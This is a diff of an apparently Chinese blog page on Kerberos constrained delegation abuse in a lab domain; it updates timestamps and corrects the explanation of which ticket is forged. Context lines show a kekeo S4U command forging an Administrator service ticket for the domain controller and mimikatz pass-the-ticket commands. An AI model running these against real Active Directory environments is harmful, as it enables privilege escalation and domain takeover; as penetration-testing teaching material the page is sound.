@@ -66,7 +66,7 @@
 <meta property="og:image" content="https://linus1124-root.github.io/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153129374.png">
 <meta property="og:image" content="https://linus1124-root.github.io/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317155009305.png">
 <meta property="article:published_time" content="2022-03-16T12:03:40.000Z">
-<meta property="article:modified_time" content="2022-03-17T07:57:53.486Z">
+<meta property="article:modified_time" content="2022-03-20T01:21:10.250Z">
 <meta property="article:author" content="chen">
 <meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary">
@@ -279,7 +279,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-03-17 15:57:53" itemprop="dateModified" datetime="2022-03-17T15:57:53+08:00">2022-03-17</time>
+      <time title="修改时间：2022-03-20 09:21:10" itemprop="dateModified" datetime="2022-03-20T09:21:10+08:00">2022-03-20</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -305,14 +305,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>4k</span>
+      <span>4.1k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>22 分钟</span>
+      <span>23 分钟</span>
     </span>
 </div>
 
@@ -461,8 +461,8 @@
 
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142022983.png" class title="image-20220317142022983">
 
-<p>这里的tgt是第一次向kdc申请的ST1</p>
-<p>使用请求到的tgt进行s4uproxy伪造请求ST2</p>
+<p>这里的tgt是PC2向kdc请求的自己可转发的票据，不是ST1</p>
+<p>使用请求到的tgt通过s4u协议伪造请求ST1，ST2</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_PC2$@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
 
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142437649.png" class title="image-20220317142437649">
@@ -472,7 +472,7 @@
 <p>未进行ptt之前是不能访问DC的 </p>
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142727658.png" class title="image-20220317142727658">
 
-<p>使用mimikatz进行ptt,注意tgs别选错了</p>
+<p>使用mimikatz进行ptt,注意票据别选错了，要选经过s4u2proxy协议提供的可转发的ST2</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
 
 <img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142746120.png" class title="image-20220317142746120">
